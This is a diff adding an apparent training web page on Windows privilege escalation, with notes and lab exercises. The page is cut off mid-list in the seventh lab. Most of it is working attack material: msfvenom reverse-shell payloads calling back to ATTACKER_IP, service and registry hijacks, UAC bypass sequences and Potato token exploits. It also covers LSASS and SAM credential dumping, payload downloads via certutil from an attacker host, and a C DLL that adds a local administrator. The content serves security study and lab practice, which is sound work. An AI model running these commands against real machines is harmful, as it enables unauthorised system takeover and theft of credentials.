@@ -1,0 +1,1184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Privilege Escalation</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Windows Privilege Escalation</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- NOTES TAB                                                    -->
+      <!-- ============================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== ENUMERATION ==================== -->
+        <h2>Enumeration Methodology</h2>
+
+        <h3>System &amp; User Info</h3>
+<pre><code class="language-powershell"># Current user & privileges
+whoami
+whoami /priv
+whoami /groups
+whoami /all
+
+# System info
+systeminfo
+hostname
+[System.Environment]::OSVersion
+
+# Users & groups
+net user
+net user username
+net localgroup
+net localgroup Administrators
+
+# Network info
+ipconfig /all
+netstat -ano
+route print
+arp -a
+
+# Running processes & services
+tasklist /svc
+Get-Process
+Get-Service | Where-Object { $_.Status -eq "Running" }
+wmic service list brief
+
+# Installed software
+wmic product get name,version
+Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+  Select-Object DisplayName, DisplayVersion
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Where-Object { $_.State -eq "Ready" }
+
+# Check for stored credentials
+cmdkey /list
+
+# Firewall status
+netsh firewall show state
+netsh advfirewall show allprofiles</code></pre>
+
+        <h3>Quick Enumeration One-Liner</h3>
+<pre><code class="language-powershell"># Rapid situational awareness
+whoami /priv; systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"; net localgroup Administrators; netstat -ano | findstr LISTEN</code></pre>
+
+        <!-- ==================== AUTOMATED TOOLS ==================== -->
+        <h2>Automated Enumeration Tools</h2>
+        <table>
+          <tr><th>Tool</th><th>Language</th><th>Usage</th></tr>
+          <tr><td>WinPEAS</td><td>.NET/C#</td><td><code>.\winPEASany.exe quiet</code> — comprehensive privesc enumeration</td></tr>
+          <tr><td>PowerUp</td><td>PowerShell</td><td><code>Import-Module .\PowerUp.ps1; Invoke-AllChecks</code> — service misconfigs, DLL hijacking</td></tr>
+          <tr><td>Seatbelt</td><td>.NET/C#</td><td><code>.\Seatbelt.exe -group=all</code> — security config, credentials, interesting files</td></tr>
+          <tr><td>SharpUp</td><td>.NET/C#</td><td><code>.\SharpUp.exe audit</code> — C# port of PowerUp checks</td></tr>
+          <tr><td>PrivescCheck</td><td>PowerShell</td><td><code>Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck</code></td></tr>
+          <tr><td>Windows Exploit Suggester</td><td>Python</td><td><code>python wes.py systeminfo.txt</code> — find missing patches / kernel exploits</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># WinPEAS — run all checks
+.\winPEASany.exe quiet servicesinfo applicationsinfo
+
+# PowerUp — common checks
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks | Out-File powerup_results.txt
+
+# Specific PowerUp checks
+Get-UnquotedService
+Get-ModifiableServiceFile
+Get-ModifiableService</code></pre>
+
+        <!-- ==================== SERVICE MISCONFIGS ==================== -->
+        <h2>Service Misconfigurations</h2>
+
+        <h3>Unquoted Service Paths</h3>
+        <p>If a service binary path has spaces and isn't quoted, Windows tries each truncated path in order. Place a malicious binary at an earlier path to hijack execution.</p>
+
+<pre><code class="language-powershell"># Find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# PowerUp
+Get-UnquotedService
+
+# Example vulnerable path:
+# C:\Program Files\Vulnerable App\Service Binary\svc.exe
+# Windows tries in order:
+#   C:\Program.exe
+#   C:\Program Files\Vulnerable.exe       ← place payload here
+#   C:\Program Files\Vulnerable App\Service.exe
+#   C:\Program Files\Vulnerable App\Service Binary\svc.exe</code></pre>
+
+<pre><code class="language-bash"># Generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe
+
+# Place in: C:\Program Files\Vulnerable.exe
+# Restart the service
+sc stop VulnService
+sc start VulnService</code></pre>
+
+        <h3>Weak Service Permissions</h3>
+        <p>If your user can modify the service configuration (<code>SERVICE_CHANGE_CONFIG</code>), change the binary path to a reverse shell.</p>
+
+<pre><code class="language-powershell"># Check service permissions with accesschk (Sysinternals)
+.\accesschk.exe /accepteula -uwcqv "Users" *
+.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+# PowerUp — find modifiable services
+Get-ModifiableService
+
+# Exploit — change binary path
+sc config VulnService binpath= "C:\temp\reverse.exe"
+sc stop VulnService
+sc start VulnService
+
+# PowerUp automated exploit
+Invoke-ServiceAbuse -Name VulnService -UserName "domain\youruser"</code></pre>
+
+        <h3>Writable Service Binaries</h3>
+        <p>If you can write to the actual service binary, replace it with your payload.</p>
+<pre><code class="language-powershell"># Check permissions on service binary
+icacls "C:\Program Files\VulnApp\service.exe"
+# Look for: (M)odify, (F)ull control, or (W)rite for your user/group
+
+# PowerUp
+Get-ModifiableServiceFile
+
+# Exploit — backup and replace
+copy "C:\Program Files\VulnApp\service.exe" "C:\temp\service.exe.bak"
+copy C:\temp\reverse.exe "C:\Program Files\VulnApp\service.exe"
+sc stop VulnService
+sc start VulnService</code></pre>
+
+        <h3>DLL Hijacking in Services</h3>
+        <p>If a service binary loads a DLL that doesn't exist or from a writable directory, place a malicious DLL to execute with the service's privileges.</p>
+<pre><code class="language-powershell"># Monitor DLL loading with Process Monitor (Sysinternals)
+# Filter: Result = "NAME NOT FOUND" AND Path ends with ".dll"
+
+# Common hijackable DLLs in missing paths:
+# - wlbsctrl.dll (IKEEXT service)
+# - wbemcomn.dll
+# - amsi.dll (in non-system directories)
+
+# Generate malicious DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll
+
+# Place DLL in the writable search path and restart service</code></pre>
+
+        <!-- ==================== REGISTRY ==================== -->
+        <h2>Registry-Based Escalation</h2>
+
+        <h3>AlwaysInstallElevated</h3>
+        <p>If both registry keys are set to 1, any user can install MSI packages as SYSTEM.</p>
+<pre><code class="language-powershell"># Check if AlwaysInstallElevated is enabled
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Both must return 0x1</code></pre>
+
+<pre><code class="language-bash"># Generate malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi
+
+# Install as SYSTEM
+msiexec /quiet /qn /i C:\temp\evil.msi</code></pre>
+
+        <h3>AutoRuns</h3>
+<pre><code class="language-powershell"># Check common autorun locations for writable entries
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Check permissions on autorun binaries
+# If writable — replace with payload, wait for reboot/login</code></pre>
+
+        <h3>Stored Credentials in Registry</h3>
+<pre><code class="language-powershell"># Search registry for passwords
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# Common locations
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"    # AutoLogon creds
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"                   # SNMP community strings
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                   # PuTTY saved sessions
+
+# VNC passwords
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"</code></pre>
+
+        <!-- ==================== SCHEDULED TASKS ==================== -->
+        <h2>Scheduled Tasks</h2>
+<pre><code class="language-powershell"># List all scheduled tasks with details
+schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|TaskName"
+
+# Find tasks running as SYSTEM or admin
+schtasks /query /fo LIST /v | findstr /B /C:"TaskName" /C:"Run As User" /C:"Task To Run"
+
+# Check if you can write to the task's binary
+icacls "C:\path\to\task\binary.exe"
+
+# Check task file permissions
+Get-ScheduledTask | ForEach-Object {
+    $action = $_.Actions | Where-Object { $_.Execute }
+    if ($action) {
+        $path = $action.Execute
+        Write-Host "$($_.TaskName) → $path"
+        icacls $path 2>$null
+    }
+}</code></pre>
+
+        <!-- ==================== TOKEN IMPERSONATION ==================== -->
+        <h2>Token Impersonation</h2>
+        <p>If your account has <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code> (common for service accounts, IIS AppPool, SQL Server), you can impersonate SYSTEM.</p>
+
+<pre><code class="language-powershell"># Check your privileges
+whoami /priv
+
+# Key privileges for impersonation:
+# SeImpersonatePrivilege        → Potato attacks, PrintSpoofer
+# SeAssignPrimaryTokenPrivilege → Token assignment attacks</code></pre>
+
+        <h3>Potato Family</h3>
+        <table>
+          <tr><th>Tool</th><th>Technique</th><th>Requirements</th></tr>
+          <tr><td>JuicyPotato</td><td>DCOM/BITS CLSID abuse</td><td>SeImpersonate, Windows ≤ Server 2019 (pre-1809)</td></tr>
+          <tr><td>PrintSpoofer</td><td>Named pipe impersonation via Print Spooler</td><td>SeImpersonate, Windows 10 / Server 2016–2019</td></tr>
+          <tr><td>GodPotato</td><td>DCOM + RPCSS named pipe</td><td>SeImpersonate, Windows 8–11 / Server 2012–2022</td></tr>
+          <tr><td>SweetPotato</td><td>Multiple techniques combined</td><td>SeImpersonate, broad version support</td></tr>
+          <tr><td>RoguePotato</td><td>DCOM/OXID resolver redirect</td><td>SeImpersonate, requires attacker-controlled host</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># PrintSpoofer — instant SYSTEM shell
+.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -c "C:\temp\reverse.exe"
+
+# GodPotato
+.\GodPotato.exe -cmd "cmd /c C:\temp\reverse.exe"
+.\GodPotato.exe -cmd "cmd /c whoami"
+
+# JuicyPotato (older systems)
+.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {CLSID}
+# Find valid CLSIDs: https://ohpe.it/juicy-potato/CLSID/
+
+# SweetPotato
+.\SweetPotato.exe -e EfsRpc -p C:\temp\reverse.exe</code></pre>
+
+        <!-- ==================== UAC BYPASS ==================== -->
+        <h2>UAC Bypass</h2>
+        <p>If you're in the Administrators group but running in a medium-integrity context, bypass UAC to get a high-integrity (elevated) shell.</p>
+
+        <h3>fodhelper.exe</h3>
+<pre><code class="language-powershell"># fodhelper.exe auto-elevates and reads a registry key for a command to execute
+# Set the registry key, then launch fodhelper
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
+  -Name "(default)" -Value "cmd.exe /c C:\temp\reverse.exe" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
+  -Name "DelegateExecute" -Value "" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+
+# Cleanup
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force</code></pre>
+
+        <h3>eventvwr.exe</h3>
+<pre><code class="language-powershell"># eventvwr.exe looks up HKCU:\Software\Classes\mscfile\shell\open\command
+New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" `
+  -Name "(default)" -Value "cmd.exe /c C:\temp\reverse.exe"
+Start-Process "C:\Windows\System32\eventvwr.exe"
+
+# Cleanup
+Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force</code></pre>
+
+        <h3>CMSTPLUA COM Object</h3>
+<pre><code class="language-powershell"># CMSTPLUA COM interface auto-elevates — use it to launch elevated process
+$com = [Activator]::CreateInstance(
+  [Type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
+$com.ShellExec("cmd.exe", "/c C:\temp\reverse.exe", "", "runas", 1)</code></pre>
+
+        <!-- ==================== KERNEL EXPLOITS ==================== -->
+        <h2>Kernel Exploits</h2>
+<pre><code class="language-bash"># 1. Gather system info
+systeminfo > systeminfo.txt
+
+# 2. Run Windows Exploit Suggester
+python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
+
+# Alternative: wesng (Windows Exploit Suggester - Next Generation)
+python wes.py systeminfo.txt</code></pre>
+
+        <table>
+          <tr><th>CVE</th><th>Name</th><th>Affected Versions</th><th>Notes</th></tr>
+          <tr><td>MS17-010</td><td>EternalBlue</td><td>Windows 7/Server 2008 R2</td><td>SMBv1 RCE — instant SYSTEM</td></tr>
+          <tr><td>CVE-2021-1675</td><td>PrintNightmare</td><td>All Windows versions</td><td>Print Spooler RCE — add admin user or RCE</td></tr>
+          <tr><td>CVE-2021-36934</td><td>HiveNightmare/SeriousSAM</td><td>Windows 10 (1809+)</td><td>Read SAM/SYSTEM hives via shadow copies</td></tr>
+          <tr><td>CVE-2022-21999</td><td>SpoolFool</td><td>Windows 10/11, Server 2019/2022</td><td>Print Spooler LPE</td></tr>
+          <tr><td>CVE-2023-28252</td><td>CLFS driver LPE</td><td>Windows 10/11, Server 2019/2022</td><td>Common Log File System elevation</td></tr>
+        </table>
+
+<pre><code class="language-bash"># PrintNightmare — add a local admin
+# From Linux (impacket)
+python3 CVE-2021-1675.py domain.local/user:Password123@TARGET_IP \
+  '\\ATTACKER_IP\share\evil.dll'
+
+# Check for vulnerability
+rpcdump.py TARGET_IP | grep -i spooler</code></pre>
+
+        <!-- ==================== CREDENTIAL HARVESTING ==================== -->
+        <h2>Credential Harvesting</h2>
+
+        <h3>SAM Database</h3>
+<pre><code class="language-powershell"># Save SAM & SYSTEM hives (requires admin)
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+reg save HKLM\SECURITY C:\temp\SECURITY</code></pre>
+
+<pre><code class="language-bash"># Extract hashes offline
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# HiveNightmare / SeriousSAM (CVE-2021-36934 — no admin needed on vulnerable systems)
+# Check if shadow copies are readable
+icacls C:\Windows\System32\config\SAM
+# If readable by BUILTIN\Users:
+.\HiveNightmare.exe</code></pre>
+
+        <h3>LSASS Dump</h3>
+<pre><code class="language-powershell"># Mimikatz — live extraction
+privilege::debug
+sekurlsa::logonpasswords
+
+# Mimikatz — dump specific
+sekurlsa::wdigest        # WDigest cleartext passwords
+sekurlsa::kerberos       # Kerberos tickets
+sekurlsa::msv            # NTLM hashes
+
+# ProcDump (Sysinternals — less suspicious)
+.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# comsvcs.dll (no tools needed — built-in)
+# Find LSASS PID first
+tasklist | findstr lsass
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
+
+# Parse dump offline with mimikatz
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords</code></pre>
+
+<pre><code class="language-bash"># Parse LSASS dump from Linux
+pypykatz lsa minidump lsass.dmp</code></pre>
+
+        <h3>Credential Manager &amp; DPAPI</h3>
+<pre><code class="language-powershell"># List stored credentials
+cmdkey /list
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# Use stored credentials
+runas /savecred /user:admin cmd.exe
+
+# Mimikatz — DPAPI credential extraction
+dpapi::cred /in:C:\Users\username\AppData\Local\Microsoft\Credentials\GUID
+dpapi::masterkey /in:C:\Users\username\AppData\Roaming\Microsoft\Protect\SID\GUID /rpc
+
+# Dump Wi-Fi passwords
+netsh wlan show profiles
+netsh wlan show profile name="NetworkName" key=clear</code></pre>
+
+        <!-- ==================== NAMED PIPE IMPERSONATION ==================== -->
+        <h2>Named Pipe Impersonation</h2>
+        <p>Create a named pipe server and wait for a privileged process to connect. Impersonate the connecting client's token.</p>
+<pre><code class="language-powershell"># Concept: create pipe → privileged service connects → impersonate its token
+# Used internally by Potato exploits
+
+# Check for named pipes
+pipelist.exe                           # Sysinternals
+Get-ChildItem \\.\pipe\               # PowerShell
+[IO.Directory]::GetFiles("\\.\pipe\") # .NET</code></pre>
+
+        <!-- ==================== DLL SEARCH ORDER HIJACKING ==================== -->
+        <h2>DLL Search Order Hijacking</h2>
+        <p>Windows DLL search order: application directory → system directories → PATH directories. If an application loads a DLL from a writable directory in the search path, hijack it.</p>
+
+<pre><code class="language-powershell"># Find writable directories in PATH
+$env:PATH -split ';' | ForEach-Object {
+    $path = $_
+    try {
+        $acl = Get-Acl $path
+        $acl.Access | Where-Object {
+            $_.FileSystemRights -match "Write|FullControl|Modify" -and
+            $_.IdentityReference -match "Users|Everyone|Authenticated"
+        } | ForEach-Object { Write-Host "[!] Writable: $path — $($_.IdentityReference)" }
+    } catch {}
+}
+
+# Use Process Monitor to find DLL load attempts
+# Filter: Operation = "CreateFile", Result = "NAME NOT FOUND", Path ends with ".dll"</code></pre>
+
+        <!-- ==================== NOTABLE CVEs ==================== -->
+        <h2>Notable CVEs Quick Reference</h2>
+        <table>
+          <tr><th>CVE</th><th>Name</th><th>Check</th><th>Exploit</th></tr>
+          <tr><td>MS17-010</td><td>EternalBlue</td><td><code>nmap --script smb-vuln-ms17-010 TARGET</code></td><td>Metasploit: <code>exploit/windows/smb/ms17_010_eternalblue</code></td></tr>
+          <tr><td>CVE-2021-1675</td><td>PrintNightmare</td><td><code>rpcdump.py TARGET | grep -i spooler</code></td><td><code>CVE-2021-1675.py</code></td></tr>
+          <tr><td>CVE-2021-36934</td><td>HiveNightmare</td><td><code>icacls C:\Windows\System32\config\SAM</code></td><td><code>HiveNightmare.exe</code></td></tr>
+          <tr><td>CVE-2020-0796</td><td>SMBGhost</td><td><code>nmap -p445 --script smb-vuln-cve-2020-0796</code></td><td>SMBv3 compression RCE</td></tr>
+        </table>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- LAB TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: WinPEAS Enumeration</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Run WinPEAS on a target machine and identify at least three potential privilege escalation vectors.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Transfer WinPEAS to the target (via web server, SMB, etc.)
+# From attacker: python3 -m http.server 8080
+Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/winPEASany.exe" -OutFile "C:\temp\winPEAS.exe"
+
+# Run with full output
+.\winPEAS.exe quiet log=C:\temp\winpeas_output.txt
+
+# Run specific checks only
+.\winPEAS.exe quiet servicesinfo
+.\winPEAS.exe quiet userinfo</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Transfer and execute WinPEAS on the target</li>
+              <li>Identify unquoted service paths in the output</li>
+              <li>Find any stored credentials or autologon passwords</li>
+              <li>Check for AlwaysInstallElevated being enabled</li>
+              <li>Note any writable service binaries or directories</li>
+              <li>Document at least three viable privesc vectors from the output</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Unquoted Service Path Exploit</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit an unquoted service path to execute a reverse shell as SYSTEM.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Setup: Create a vulnerable service (run as admin on target)
+sc create VulnSvc binPath= "C:\Program Files\Vulnerable Application\Service Runner\svc.exe" start= auto obj= LocalSystem
+
+# Verify the unquoted path
+wmic service get name,pathname | findstr /i "VulnSvc"
+# Output: C:\Program Files\Vulnerable Application\Service Runner\svc.exe  (no quotes!)</code></pre>
+<pre><code class="language-bash"># Generate payload on attacker
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe
+
+# Start listener
+nc -lvnp 4444</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Identify the unquoted path with <code>wmic</code> or PowerUp</li>
+              <li>Determine which intermediate path is writable (check with <code>icacls</code>)</li>
+              <li>Generate an EXE payload with msfvenom</li>
+              <li>Place the payload at the correct path (e.g., <code>C:\Program Files\Vulnerable.exe</code>)</li>
+              <li>Restart the service and catch your SYSTEM shell</li>
+              <li>Clean up: remove the payload and restore the service</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Token Impersonation with PrintSpoofer</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit SeImpersonatePrivilege on a service account to escalate to SYSTEM using PrintSpoofer.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Scenario: You have a shell as a service account (e.g., IIS AppPool, SQL Service)
+# Verify you have the required privilege
+whoami /priv
+# Look for: SeImpersonatePrivilege — Enabled
+
+# Verify current integrity level
+whoami /groups | findstr "Label"</code></pre>
+<pre><code class="language-bash"># Transfer PrintSpoofer to the target
+# From attacker machine:
+python3 -m http.server 8080
+
+# On target:
+certutil -urlcache -split -f http://ATTACKER_IP:8080/PrintSpoofer64.exe C:\temp\PrintSpoofer64.exe</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm <code>SeImpersonatePrivilege</code> is present and enabled</li>
+              <li>Transfer PrintSpoofer to the target</li>
+              <li>Run <code>.\PrintSpoofer64.exe -i -c cmd</code> for an interactive SYSTEM shell</li>
+              <li>Alternatively, execute a reverse shell: <code>.\PrintSpoofer64.exe -c "C:\temp\rev.exe"</code></li>
+              <li>If PrintSpoofer fails, try GodPotato or SweetPotato as alternatives</li>
+              <li>Verify SYSTEM access: <code>whoami</code> should return <code>nt authority\system</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: UAC Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass UAC to elevate from medium integrity to high integrity using multiple techniques.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Scenario: You are a local admin but in a medium-integrity context
+# Verify current state
+whoami /groups | findstr "Level"
+# Should show: Mandatory Label\Medium Mandatory Level
+
+# Verify you're in Administrators group
+net localgroup Administrators
+# Your user should be listed
+
+# UAC settings check
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
+# Value 5 = default (prompt for consent), 0 = disabled, 2 = prompt for creds</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm you're in the Administrators group but at Medium integrity</li>
+              <li><strong>Method 1 — fodhelper:</strong> Set the registry key and launch fodhelper.exe to get an elevated shell</li>
+              <li><strong>Method 2 — eventvwr:</strong> Use the eventvwr.exe auto-elevation registry hijack</li>
+              <li><strong>Method 3 — CMSTPLUA COM:</strong> Use the COM object for auto-elevation</li>
+              <li>Verify each method produces a High integrity shell: <code>whoami /groups | findstr "High"</code></li>
+              <li>Clean up all registry modifications after each method</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: AlwaysInstallElevated</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit the AlwaysInstallElevated registry misconfiguration to install an MSI package as SYSTEM.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Check if AlwaysInstallElevated is enabled (both keys must be set to 1)
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Setup (for lab — enable the policy on a test machine):
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f</code></pre>
+<pre><code class="language-bash"># Step 2: Generate a malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi
+
+# Step 3: Start listener
+nc -lvnp 4444</code></pre>
+<pre><code class="language-powershell"># Step 4: Install the MSI on the target (runs as SYSTEM due to policy)
+msiexec /quiet /qn /i C:\temp\evil.msi</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Verify both registry keys are set to 1.</li>
+              <li>Generate the MSI payload and transfer to the target.</li>
+              <li>Execute <code>msiexec /quiet /qn /i evil.msi</code> and catch the SYSTEM shell.</li>
+              <li>Clean up: remove the registry keys after testing.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Weak Service Permissions Exploitation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Identify and exploit services where low-privilege users have modification rights (SERVICE_CHANGE_CONFIG).</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Find services with weak permissions using accesschk
+accesschk.exe /accepteula -uwcqv "Everyone" * 2>$null
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>$null
+accesschk.exe /accepteula -uwcqv "BUILTIN\Users" * 2>$null
+
+# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE
+
+# Step 2: PowerUp automated check
+Import-Module .\PowerUp.ps1
+Get-ModifiableService</code></pre>
+<pre><code class="language-powershell"># Step 3: Exploit — change service binary path
+sc config VulnService binPath= "C:\temp\reverse.exe"
+sc stop VulnService
+sc start VulnService
+
+# Or add a local admin
+sc config VulnService binPath= "net localgroup Administrators youruser /add"
+sc stop VulnService
+sc start VulnService
+
+# Verify
+net localgroup Administrators</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Scan all services for weak DACLs with accesschk.</li>
+              <li>Identify a service where your user has SERVICE_CHANGE_CONFIG.</li>
+              <li>Change the binPath to your payload and restart the service.</li>
+              <li>Restore the original binPath after exploitation.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: DLL Search Order Hijacking</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit the Windows DLL search order to load a malicious DLL by placing it in a writable directory that's searched before the legitimate DLL location.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># DLL Search Order (SafeDllSearchMode enabled):
+# 1. Application directory
+# 2. System directory (C:\Windows\System32)
+# 3. 16-bit system directory
+# 4. Windows directory (C:\Windows)
+# 5. Current directory
+# 6. PATH directories
+
+# Step 1: Find a target application that loads a missing DLL
+# Use Process Monitor: filter for "NAME NOT FOUND" on .dll files
+# procmon.exe /AcceptEula
+
+# Step 2: Identify writable directories in the search path
+$env:PATH -split ';' | ForEach-Object {
+    if (Test-Path $_) {
+        $acl = Get-Acl $_
+        [PSCustomObject]@{
+            Path = $_
+            WritableByUser = ($acl.Access | Where-Object {
+                $_.FileSystemRights -match "Write|FullControl" -and
+                $_.IdentityReference -match "Users|Everyone|Authenticated"
+            }).Count -gt 0
+        }
+    }
+} | Format-Table -AutoSize</code></pre>
+<pre><code class="language-c">// Step 3: Create a proxy DLL (forwards legitimate calls + runs payload)
+// hijack_dll.c — Compile: cl.exe /LD hijack_dll.c /Fe:target.dll
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        // Execute payload
+        WinExec("cmd.exe /c net localgroup Administrators youruser /add", 0);
+    }
+    return TRUE;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use Process Monitor to find applications that fail to load DLLs from writable locations.</li>
+              <li>Check if any PATH directories are writable by your user.</li>
+              <li>Compile a payload DLL with the missing DLL's name and place it in the writable directory.</li>
